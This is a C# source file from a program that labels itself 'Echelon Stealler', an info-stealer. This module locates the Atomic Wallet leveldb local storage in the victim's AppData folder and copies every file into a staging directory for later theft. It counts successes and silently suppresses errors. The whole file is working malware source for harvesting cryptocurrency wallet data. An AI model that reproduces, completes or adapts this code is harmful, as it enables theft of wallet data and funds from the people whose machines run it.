///////////////////////////////////////////////////////
//Echelon Stealler, C# Malware Systems by MadСod v1.4.2//
///////////////////////////////////////////////////////

using System.IO;

namespace Echelon
{
    class AtomicWallet
    {
        public static int count = 0;
        //AtomicWallet, AtomicWallet 2.8.0
        public static string AtomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
        public static void AtomicStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\atomic\\Local Storage\\leveldb\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + AtomDir);
                    file.CopyTo(directorypath + AtomDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch { }

        }
    }
}
